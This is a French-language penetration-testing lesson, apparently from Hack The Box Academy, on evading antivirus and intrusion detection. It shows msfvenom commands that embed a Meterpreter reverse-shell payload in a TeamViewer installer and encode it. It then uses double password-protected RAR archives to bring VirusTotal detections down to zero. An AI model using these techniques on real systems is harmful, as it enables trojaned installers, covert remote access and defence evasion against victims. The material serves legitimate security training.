
Pour mieux apprendre à attaquer une cible de manière efficace et discrète, nous devons d'abord mieux comprendre comment cette cible est défendue. Deux nouveaux termes sont introduits :

- Protection des terminaux (Endpoint protection)
- Protection périmétrique (Perimeter protection)

---

## Protection des terminaux

La `protection des terminaux` désigne tout dispositif ou service localisé dont le seul but est de protéger un seul hôte sur le réseau. L'hôte peut être un ordinateur personnel, un poste de travail d'entreprise ou un serveur dans la zone démilitarisée (`DMZ`) d'un réseau.

La protection des terminaux se présente généralement sous la forme de packs logiciels qui incluent une `protection antivirus`, une `protection antimalware` (ceci inclut les bloatwares, spywares, adwares, scarewares, ransomwares), un `pare-feu` et une protection `anti-DDOS`, le tout dans un seul et même progiciel. Nous sommes plus familiers avec cette forme qu'avec la suivante, car la plupart d'entre nous utilisent des logiciels de protection des terminaux sur nos PC à la maison ou sur les postes de travail de notre lieu de travail. Avast, Nod32, Malwarebytes et BitDefender ne sont que quelques noms actuels.

---

#### Protection périmétrique

La `protection périmétrique` se présente généralement sous la forme de dispositifs physiques ou virtualisés à la périphérie du réseau. Ces `équipements de périphérie` (edge devices) fournissent eux-mêmes un accès à l'`intérieur` du réseau depuis l'`extérieur`, en d'autres termes, du `public` au `privé`.

Entre ces deux zones, on trouvera parfois une troisième, appelée zone démilitarisée (`DMZ`), qui a été mentionnée précédemment. Il s'agit d'une zone avec un `niveau de politique de sécurité plus faible` que celui des `réseaux internes`, mais avec un `niveau de confiance` plus élevé que la `zone externe`, qui est le vaste Internet. C'est l'espace virtuel où sont hébergés les serveurs accessibles au public, qui envoient et reçoivent des données pour les clients publics depuis Internet, mais qui sont également gérés de l'intérieur et mis à jour avec des correctifs, des informations et d'autres données pour maintenir à jour les informations servies et satisfaire les clients des serveurs.

---

## Politiques de sécurité

Les politiques de sécurité sont le moteur de toute posture de sécurité bien entretenue de n'importe quel réseau. Elles fonctionnent de la même manière que les listes de contrôle d'accès (ACL, Access Control Lists) pour quiconque est familier avec le matériel pédagogique Cisco CCNA. Il s'agit essentiellement d'une liste de déclarations `d'autorisation` (allow) et `de refus` (deny) qui dictent comment le trafic ou les fichiers peuvent exister à l'intérieur d'une limite de réseau. Plusieurs listes peuvent agir sur plusieurs parties du réseau, ce qui permet une grande flexibilité dans une configuration. Ces listes peuvent également cibler différentes caractéristiques du réseau et des hôtes, en fonction de l'endroit où elles résident :

- Politiques de trafic réseau
- Politiques d'application
- Politiques de contrôle d'accès utilisateur
- Politiques de gestion de fichiers
- Politiques de protection DDoS
- Autres

Bien que toutes les catégories ci-dessus n'aient pas forcément les mots « Politique de sécurité » qui leur sont attachés, tous les mécanismes de sécurité qui les entourent fonctionnent sur le même principe de base, les entrées `d'autorisation` (allow) et `de refus` (deny). La seule différence est l'objet cible auquel elles se réfèrent et s'appliquent. La question reste donc la suivante : comment faisons-nous correspondre les événements du réseau avec ces règles afin que les actions mentionnées précédemment puissent être prises ?

Il existe plusieurs façons de faire correspondre un événement ou un objet avec une entrée de politique de sécurité :

|**Politique de sécurité**|**Description**|
|---|---|
|`Détection basée sur les signatures (Signature-based Detection)`|L'opération des paquets sur le réseau et la comparaison avec des modèles d'attaque pré-construits et pré-établis connus sous le nom de signatures. Toute correspondance à 100 % avec ces signatures générera des alarmes.|
|`Détection heuristique / statistique d'anomalies (Heuristic / Statistical Anomaly Detection)`|Comparaison comportementale par rapport à une base de référence établie incluant des signatures de modus operandi pour les menaces persistantes avancées (APT, Advanced Persistent Threats) connues. La base de référence identifiera la norme pour le réseau et les protocoles couramment utilisés. Tout écart par rapport au seuil maximum générera des alarmes.|
|`Détection par analyse de protocole avec état (Stateful Protocol Analysis Detection)`|Reconnaissance de la divergence des protocoles déclarés par comparaison d'événements à l'aide de profils pré-construits de définitions généralement acceptées d'activité non malveillante.|
|`Surveillance en direct et alertes (basée sur un SOC)`|Une équipe d'analystes dans un centre des opérations de sécurité (SOC, Security Operations Center) dédié, interne ou loué, utilise un logiciel de flux en direct pour surveiller l'activité du réseau et les systèmes d'alerte intermédiaires pour toute menace potentielle, décidant eux-mêmes si la menace doit faire l'objet d'une action ou laissant les mécanismes automatisés agir à leur place.|

---

## Techniques de contournement

La plupart des logiciels antivirus basés sur l'hôte s'appuient aujourd'hui principalement sur la `détection basée sur les signatures` pour identifier les aspects du code malveillant présents dans un échantillon de logiciel. Ces signatures sont placées à l'intérieur du moteur antivirus, où elles sont ensuite utilisées pour analyser l'espace de stockage et les processus en cours d'exécution à la recherche de correspondances. Lorsqu'un logiciel inconnu arrive sur une partition et est identifié par le logiciel antivirus, la plupart des antivirus mettent en quarantaine le programme malveillant et terminent le processus en cours d'exécution.

Comment contourner toute cette surveillance ? Nous jouons le jeu. Les exemples montrés dans la section `Encodeurs` montrent que le simple encodage des charges utiles (payloads) en utilisant différents schémas d'encodage avec de multiples itérations n'est pas suffisant pour tous les produits AV. De plus, le simple fait d'établir un canal de communication entre l'attaquant et la victime peut déclencher des alarmes avec les capacités actuelles des produits IDS/IPS existants.

Cependant, avec la sortie de MSF6, msfconsole peut tunnéliser la communication chiffrée en AES depuis n'importe quel shell Meterpreter vers l'hôte de l'attaquant, chiffrant avec succès le trafic lorsque la charge utile est envoyée à l'hôte de la victime. Cela s'occupe principalement des IDS/IPS basés sur le réseau. Dans de rares cas, nous pouvons être confrontés à des ensembles de règles de trafic très stricts qui signalent notre connexion en fonction de l'adresse IP de l'expéditeur. La seule façon de contourner cela est de trouver les services qui sont autorisés à passer. Un excellent exemple est le piratage d'Equifax en 2017, où des pirates malveillants ont abusé de la vulnérabilité Apache Struts pour accéder à un réseau de serveurs de données critiques. Des techniques d'exfiltration DNS (DNS exfiltration) ont été utilisées pour extraire lentement les données du réseau vers le domaine des pirates sans être remarquées pendant des mois. Pour en savoir plus sur cette attaque, consultez les liens ci-dessous :

- [Rapport post-mortem du gouvernement américain sur le piratage d'Equifax](https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/)
- [Se protéger de l'exfiltration DNS](https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411)
- [Arrêter l'exfiltration de données et la propagation de malwares via DNS](https://channelpostmea.com/wp-content/uploads/2017/08/infoblox-whitepaper-data-exfiltration-and-dns-closing-the-back-door.pdf)

Pour en revenir à msfconsole, sa capacité à maintenir désormais des tunnels chiffrés en AES, ainsi que la fonctionnalité de Meterpreter de s'exécuter en mémoire, augmentent considérablement nos capacités. Cependant, nous avons toujours le problème de ce qui arrive à une charge utile une fois qu'elle atteint sa destination, avant qu'elle ne soit exécutée et placée en mémoire. Ce fichier pourrait voir son empreinte (signature) prise, être comparé à la base de données et bloqué, anéantissant ainsi nos chances d'accéder à la cible. Nous pouvons également être sûrs que les développeurs de logiciels AV examinent les modules et les capacités de msfconsole pour ajouter le code et les fichiers résultants à leur base de données de signatures, ce qui fait que la plupart, sinon la totalité, des charges utiles par défaut sont immédiatement bloquées par les logiciels AV de nos jours.

Nous avons de la chance car `msfvenom` offre la possibilité d'utiliser des modèles d'exécutables. Cela nous permet d'utiliser des modèles prédéfinis pour les fichiers exécutables, d'y injecter notre charge utile (sans jeu de mots), et d'utiliser `n'importe quel` exécutable comme plateforme à partir de laquelle nous pouvons lancer notre attaque. Nous pouvons intégrer le shellcode dans n'importe quel installateur, paquet ou programme que nous avons sous la main, en cachant le shellcode de la charge utile au plus profond du code légitime du produit réel. Cela obscurcit considérablement notre code malveillant et, plus important encore, réduit nos chances de détection. Il existe de nombreuses combinaisons valides entre des fichiers exécutables réels et légitimes, nos différents schémas d'encodage (et leurs itérations), et nos différentes variantes de shellcode de charge utile. Cela génère ce que l'on appelle un exécutable piégé (backdoored executable).

Jetez un œil à l'extrait de code ci-dessous pour comprendre comment msfvenom peut intégrer des charges utiles dans n'importe quel fichier exécutable :

        shellsession
`ppporrkkky@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5  Attempting to read payload from STDIN... Found 1 compatible encoders Attempting to encode payload with 5 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 27 (iteration=0) x86/shikata_ga_nai succeeded with size 54 (iteration=1) x86/shikata_ga_nai succeeded with size 81 (iteration=2) x86/shikata_ga_nai succeeded with size 108 (iteration=3) x86/shikata_ga_nai succeeded with size 135 (iteration=4) x86/shikata_ga_nai chosen with final size 135 Payload size: 135 bytes Saved as: /home/user/Desktop/TeamViewer_Setup.exe`

        shellsession
`ppporrkkky@htb[/htb]$ ls  Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes`

La plupart du temps, lorsqu'une cible lance un exécutable piégé, rien ne semblera se produire, ce qui peut éveiller des soupçons dans certains cas. Pour améliorer nos chances, nous devons déclencher la poursuite de l'exécution normale de l'application lancée tout en extrayant la charge utile dans un thread distinct de l'application principale. Nous le faisons avec l'option `-k` comme indiqué ci-dessus. Cependant, même avec l'option `-k` en cours d'exécution, la cible ne remarquera la porte dérobée en cours que si elle lance le modèle d'exécutable piégé à partir d'un environnement en ligne de commande (CLI). Si elle le fait, une fenêtre distincte apparaîtra avec la charge utile, qui ne se fermera pas tant que nous n'aurons pas terminé l'interaction de la session de la charge utile sur la cible.

---

## Archives

L'archivage d'une information telle qu'un fichier, un dossier, un script, un exécutable, une image ou un document et la protection de l'archive par un mot de passe contournent aujourd'hui de nombreuses signatures antivirus courantes. Cependant, l'inconvénient de ce processus est qu'elles seront signalées comme des notifications dans le tableau de bord des alarmes de l'antivirus comme ne pouvant pas être analysées car verrouillées par un mot de passe. Un administrateur peut choisir d'inspecter manuellement ces archives pour déterminer si elles sont malveillantes ou non.

#### Génération de la charge utile

        shellsession
`ppporrkkky@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5  Attempting to read payload from STDIN... Found 1 compatible encoders Attempting to encode payload with 5 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 27 (iteration=0) x86/shikata_ga_nai succeeded with size 54 (iteration=1) x86/shikata_ga_nai succeeded with size 81 (iteration=2) x86/shikata_ga_nai succeeded with size 108 (iteration=3) x86/shikata_ga_nai succeeded with size 135 (iteration=4) x86/shikata_ga_nai chosen with final size 135 Payload size: 135 bytes Saved as: /home/user/test.js`

        shellsession
`ppporrkkky@htb[/htb]$ cat test.js  +n"t$G4ɱ1zzjV6icoBs>Z*9vt%1 <...SNIP...> Qa*޴RW%Š.\=;.lTXFT`

Si nous vérifions sur VirusTotal pour obtenir une base de référence de détection à partir de la charge utile que nous avons générée, les résultats seront les suivants.

#### VirusTotal

        shellsession
`ppporrkkky@htb[/htb]$ msf-virustotal -k <API key> -f test.js   [*] WARNING: When you upload or otherwise submit content, you give VirusTotal [*] (and those we work with) a worldwide, royalty free, irrevocable and transferable [*] licence to use, edit, host, store, reproduce, modify, create derivative works, [*] communicate, publish, publicly perform, publicly display and distribute such [*] content. To read the complete Terms of Service for VirusTotal, please go to the [*] following link: [*] https://www.virustotal.com/en/about/terms-of-service/ [*]  [*] If you prefer your own API key, you may obtain one at VirusTotal.  [*] Enter 'Y' to acknowledge: Y   [*] Using API key: <API key> [*] Please wait while I upload test.js... [*] VirusTotal: Scan request successfully queued, come back later for the report [*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a [*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309 [*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105 [*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167047 [*] Requesting the report... [*] Received code 0. Waiting for another 60 seconds... [*] Analysis Report: test.js (11 / 59): <...SNIP...> ====================================================================================================   Antivirus             Detected  Version               Result                             Update  ---------             --------  -------               ------                             ------  ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510  AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510  Acronis               false     1.2.0.108                                                20220426  Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510  AhnLab-V3             false     3.21.3.10230                                             20220510  Antiy-AVL             false     3.0                                                      20220510  Arcabit               false     1.0.0.889                                                20220510  Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510  Avira                 false     8.3.3.14                                                 20220510  Baidu                 false     1.0.0.2                                                  20190318  BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510  BitDefenderTheta      false     7.2.37796.0                                              20220428  Bkav                  false     1.3.0.9899                                               20220509  CAT-QuickHeal         false     14.00                                                    20220510  CMC                   false     2.10.2019.1                                              20211026  ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509  Comodo                false     34607                                                    20220510  Cynet                 false     4.0.0.27                                                 20220510  Cyren                 false     6.5.1.2                                                  20220510  DrWeb                 false     7.0.56.4040                                              20220510  ESET-NOD32            false     25243                                                    20220510  Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510  F-Secure              false     18.10.978.51                                             20220510  FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510  Fortinet              false     6.2.142.0                                                20220510  GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510  Gridinsoft            false     1.0.77.174                                               20220510  Ikarus                false     6.0.24.0                                                 20220509  Jiangmin              false     16.0.100                                                 20220509  K7AntiVirus           false     12.12.42275                                              20220510  K7GW                  false     12.12.42275                                              20220510  Kaspersky             false     21.0.1.45                                                20220510  Kingsoft              false     2017.9.26.565                                            20220510  Lionic                false     7.5                                                      20220510  MAX                   true      2019.9.16.1           malware (ai score=89)              20220510  Malwarebytes          false     4.2.2.27                                                 20220510  MaxSecure             false     1.0.0.1                                                  20220510  McAfee                false     6.0.6.653                                                20220510  McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510  MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510  Microsoft             false     1.1.19200.5                                              20220510  NANO-Antivirus        false     1.0.146.25588                                            20220510  Panda                 false     4.6.4.2                                                  20220509  Rising                false     25.0.0.27                                                20220510  SUPERAntiSpyware      false     5.6.0.1032                                               20220507  Sangfor               false     2.14.0.0                                                 20220507  Sophos                false     1.4.1.0                                                  20220510  Symantec              false     1.17.0.0                                                 20220510  TACHYON               false     2022-05-10.02                                            20220510  Tencent               false     1.0.0.1                                                  20220510  TrendMicro            false     11.0.0.1006                                              20220510  TrendMicro-HouseCall  false     10.0.0.1040                                              20220510  VBA32                 false     5.0.0                                                    20220506  ViRobot               false     2014.3.20.0                                              20220510  VirIT                 false     9.5.191                                                  20220509  Yandex                false     5.5.2.24                                                 20220428  Zillya                false     2.0.0.4627                                               20220509  ZoneAlarm             false     1.0                                                      20220510  Zoner                 false     2.2.2.0                                                  20220509`

Maintenant, essayez de l'archiver deux fois, en protégeant les deux archives par un mot de passe lors de leur création, et en supprimant l'extension `.rar`/`.zip`/`.7z` de leurs noms. Pour ce faire, nous pouvons installer l'[utilitaire RAR](https://www.rarlab.com/download.htm) de RARLabs, qui fonctionne exactement comme WinRAR sur Windows.

#### Archivage de la charge utile

        shellsession
`ppporrkkky@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz ppporrkkky@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar ppporrkkky@htb[/htb]$ rar a ~/test.rar -p ~/test.js  Enter password (will not be echoed): ****** Reenter password: ******  RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017 Trial version             Type 'rar -?' for help Evaluation copy. Please register.  Creating archive test.rar Adding    test.js                                                     OK  Done`

        shellsession
`ppporrkkky@htb[/htb]$ ls  test.js   test.rar`

#### Suppression de l'extension .RAR

        shellsession
`ppporrkkky@htb[/htb]$ mv test.rar test ppporrkkky@htb[/htb]$ ls  test   test.js`

#### Nouvel archivage de la charge utile

        shellsession
`ppporrkkky@htb[/htb]$ rar a test2.rar -p test  Enter password (will not be echoed): ****** Reenter password: ******  RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017 Trial version             Type 'rar -?' for help Evaluation copy. Please register.  Creating archive test2.rar Adding    test                                                        OK  Done`

#### Suppression de l'extension .RAR

        shellsession
`ppporrkkky@htb[/htb]$ mv test2.rar test2 ppporrkkky@htb[/htb]$ ls  test   test2   test.js`

Le fichier test2 est l'archive .rar finale dont l'extension (.rar) a été supprimée du nom. Après cela, nous pouvons procéder à son téléversement sur VirusTotal pour une nouvelle vérification.

#### VirusTotal

        shellsession
`ppporrkkky@htb[/htb]$ msf-virustotal -k <API key> -f test2  [*] Using API key: <API key> [*] Please wait while I upload test2... [*] VirusTotal: Scan request successfully queued, come back later for the report [*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d [*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429 [*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad [*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167804 [*] Requesting the report... [*] Received code 0. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad =================================================================================================   Antivirus             Detected  Version         Result  Update  ---------             --------  -------         ------  ------  ALYac                 false     1.1.3.1                 20220510  Acronis               false     1.2.0.108               20220426  Ad-Aware              false     3.0.21.193              20220510  AhnLab-V3             false     3.21.3.10230            20220510  Antiy-AVL             false     3.0                     20220510  Arcabit               false     1.0.0.889               20220510  Avira                 false     8.3.3.14                20220510  BitDefender           false     7.2                     20220510  BitDefenderTheta      false     7.2.37796.0             20220428  Bkav                  false     1.3.0.9899              20220509  CAT-QuickHeal         false     14.00                   20220510  CMC                   false     2.10.2019.1             20211026  ClamAV                false     0.105.0.0               20220509  Comodo                false     34606                   20220509  Cynet                 false     4.0.0.27                20220510  Cyren                 false     6.5.1.2                 20220510  DrWeb                 false     7.0.56.4040             20220510  ESET-NOD32            false     25243                   20220510  Emsisoft              false     2021.5.0.7597           20220510  F-Secure              false     18.10.978.51            20220510  FireEye               false     35.24.1.0               20220510  Fortinet              false     6.2.142.0               20220510  Gridinsoft            false     1.0.77.174              20220510  Jiangmin              false     16.0.100                20220509  K7AntiVirus           false     12.12.42275             20220510  K7GW                  false     12.12.42275             20220510  Kingsoft              false     2017.9.26.565           20220510  Lionic                false     7.5                     20220510  MAX                   false     2019.9.16.1             20220510  Malwarebytes          false     4.2.2.27                20220510  MaxSecure             false     1.0.0.1                 20220510  McAfee-GW-Edition     false     v2019.1.2+3728          20220510  MicroWorld-eScan      false     14.0.409.0              20220510  NANO-Antivirus        false     1.0.146.25588           20220510  Panda                 false     4.6.4.2                 20220509  Rising                false     25.0.0.27               20220510  SUPERAntiSpyware      false     5.6.0.1032              20220507  Sangfor               false     2.14.0.0                20220507  Symantec              false     1.17.0.0                20220510  TACHYON               false     2022-05-10.02           20220510  Tencent               false     1.0.0.1                 20220510  TrendMicro-HouseCall  false     10.0.0.1040             20220510  VBA32                 false     5.0.0                   20220506  ViRobot               false     2014.3.20.0             20220510  VirIT                 false     9.5.191                 20220509  Yandex                false     5.5.2.24                20220428  Zillya                false     2.0.0.4627              20220509  ZoneAlarm             false     1.0                     20220510  Zoner                 false     2.2.2.0                 20220509`

Comme nous pouvons le voir ci-dessus, c'est un excellent moyen de transférer des données à la fois `vers` et `depuis` l'hôte cible.

---

## Packers

Le terme `Packer` (compresseur d'exécutable) désigne le résultat d'un processus de `compression d'exécutable` où la charge utile est empaquetée avec un programme exécutable et avec le code de décompression dans un seul fichier. Lorsqu'il est exécuté, le code de décompression ramène l'exécutable piégé à son état d'origine, offrant ainsi une autre couche de protection contre les mécanismes d'analyse de fichiers sur les hôtes cibles. Ce processus se déroule de manière transparente pour que l'exécutable compressé puisse être exécuté de la même manière que l'exécutable original tout en conservant toutes ses fonctionnalités d'origine. De plus, msfvenom offre la possibilité de compresser et de modifier la structure de fichier d'un exécutable piégé et de chiffrer la structure du processus sous-jacent.

Une liste de logiciels de type packer populaires :

||||
|---|---|---|
|[UPX packer](https://upx.github.io)|[The Enigma Protector](https://enigmaprotector.com)|[MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm)|
|Alternate EXE Packer|ExeStealth|Morphine|
|MEW|Themida||

Si vous souhaitez en savoir plus sur les packers, veuillez consulter le [projet PolyPack](https://jon.oberheide.org/files/woot09-polypack.pdf).

---

## Codage d'exploits

Lors du codage de notre exploit ou du portage d'un exploit préexistant vers le Framework, il est bon de s'assurer que le code de l'exploit n'est pas facilement identifiable par les mesures de sécurité mises en œuvre sur le système cible.

Par exemple, un exploit typique de `dépassement de tampon` (Buffer Overflow) peut être facilement distingué du trafic normal circulant sur le réseau en raison de ses motifs de tampon hexadécimaux. Les placements d'IDS/IPS peuvent vérifier le trafic vers la machine cible et remarquer des motifs spécifiques surutilisés pour le code d'exploitation.

Lors de l'assemblage de notre code d'exploit, la randomisation peut aider à ajouter une certaine variation à ces motifs, ce qui brisera les signatures de la base de données IPS/IDS pour les tampons d'exploit bien connus. Cela peut être fait en entrant un commutateur `Offset` dans le code du module msfconsole :

        ruby
`'Targets' => [     [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ], ],`

Outre le code de BoF, il faut toujours éviter d'utiliser des `NOP sleds` évidents où le shellcode doit atterrir une fois le dépassement terminé. Veuillez noter que le but du code de BoF est de faire planter le service en cours d'exécution sur la machine cible, tandis que le NOP sled est la mémoire allouée où notre shellcode (la charge utile) est inséré. Les entités IPS/IDS vérifient régulièrement ces deux éléments, il est donc bon de tester notre code d'exploit personnalisé dans un environnement de type bac à sable (sandbox) avant de le déployer sur le réseau du client. Bien sûr, nous n'aurons peut-être qu'une seule chance de le faire correctement lors d'une évaluation.

Pour plus d'informations sur le codage d'exploits, nous vous recommandons de consulter le livre [Metasploit - The Penetration Tester's Guide](https://nostarch.com/metasploit) de No Starch Press. Ils approfondissent en détail la création de nos propres exploits pour le Framework.

---

Les systèmes de prévention d'intrusion (IPS, Intrusion Prevention Systems) et les moteurs antivirus sont les outils de défense les plus courants qui peuvent anéantir une prise de pied initiale sur la cible. Ceux-ci fonctionnent principalement sur les signatures de l'ensemble du fichier malveillant ou de l'étape de stub.

---

## Une note sur le contournement

Cette section aborde le contournement à un niveau général. Soyez à l'affût des modules ultérieurs qui approfondiront la théorie et les connaissances pratiques nécessaires pour effectuer un contournement plus efficace. Il est utile d'essayer certaines de ces techniques sur d'anciennes machines HTB ou d'installer une VM avec d'anciennes versions de Windows Defender ou des moteurs AV gratuits, et de pratiquer les compétences de contournement. C'est un sujet vaste qui ne peut être traité de manière adéquate en une seule section.